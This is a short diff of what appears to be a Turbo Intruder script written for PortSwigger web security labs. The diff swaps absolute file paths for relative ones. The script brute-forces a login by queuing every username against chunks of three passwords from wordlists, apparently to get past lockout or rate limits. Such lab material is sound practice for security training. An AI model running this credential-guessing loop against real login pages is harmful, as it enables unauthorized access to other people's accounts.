@@ -6,10 +6,10 @@ def queueRequests(target, wordlists):
                            )
     buffer = []
     chunk_size = 3
-    for line in open('/Users/alexrrr/portswigger-labs/passwords.txt'):
+    for line in open('passwords.txt'):
         buffer.append(line.rstrip())
         if len(buffer) == chunk_size:
-            for username in open('/Users/alexrrr/portswigger-labs/usernames.txt'):
+            for username in open('usernames.txt'):
                 for passwd in buffer:
                     engine.queue(target.req, [username.rstrip(), passwd])
             buffer = []
